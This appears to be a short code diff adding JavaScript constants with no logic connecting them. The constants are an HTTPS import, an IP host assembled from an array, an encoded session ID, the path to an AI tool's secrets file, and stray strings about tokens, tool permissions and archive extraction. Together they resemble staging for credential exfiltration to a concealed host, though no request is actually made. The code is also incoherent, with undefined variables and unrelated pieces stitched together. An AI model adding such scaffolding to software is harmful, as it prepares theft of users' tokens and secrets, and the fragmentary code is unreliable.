@@ -1,0 +1,10 @@
+import httpsClient from "https";
+const host = [192,0,2,1].join(".");
+const permission = "can_use_tool";
+const agent = "session token";
+const key = serial;
+const encoded = encodeURIComponent(session.sid);
+const error = "Too many authentication failures";
+const warning = "This token cannot be recovered";
+const extract = "tar -xzf archive.tgz --strip-components=1";
+const path = "/home/user/.claude/secrets.json";
